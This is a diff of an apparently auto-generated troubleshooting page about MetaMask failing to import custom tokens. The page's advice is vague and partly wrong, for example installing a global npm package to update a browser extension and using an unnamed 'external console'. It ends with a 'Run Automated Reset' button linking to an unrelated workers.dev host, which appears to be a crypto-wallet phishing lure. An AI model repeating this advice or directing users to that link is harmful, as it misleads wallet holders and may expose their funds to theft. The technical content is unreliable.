@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,29 +42,34 @@
 <h1>Metamask Extension Bug Importing A Custom Token Does Not Work</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to import custom tokens into their Metamask wallet, resulting in an inability to interact with or manage these tokens within the extension.</li>
+<li>Users are unable to import custom tokens into their Metamask wallet extension, resulting in an inability to interact with or manage these tokens within the wallet.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a potential mismatch between the token's smart contract address and the network ID, or outdated extension version, leading to failed token imports.</li>
+<li>The error occurs due to a potential mismatch between the token's contract address and the network ID, or an issue with the token's metadata, such as its symbol or decimal places, not being correctly recognized by Metamask.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the token's contract address for accuracy and ensure it matches the expected format.</li>
-<li>Verify the network ID to confirm it aligns with the token's native blockchain.</li>
-<li>Update Metamask extension to the latest version using the following command:</li>
+<li>Check the token's contract address and ensure it matches the one on the Ethereum network.</li>
+<li>Verify the token's metadata, including its symbol and decimal places, to ensure it aligns with the expected format.</li>
+<li>Use the following JSON configuration to manually add the token:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>@metamask/core@latest
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token contract address...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token symbol...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">...</span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="w"> </span><span class="err">decimal</span><span class="w"> </span><span class="err">places...</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token logo URL...&quot;</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced debugging and token import troubleshooting. </p>
+<p>Consider utilizing an external console to troubleshoot token import issues. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Custom token contract address and network ID available</li>
-<li>Node Package Manager (npm) installed for updating Metamask core</li>
+<li>Metamask wallet extension installed and configured.</li>
+<li>Token contract address and metadata available.</li>
+<li>Basic understanding of Ethereum network and token standards.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
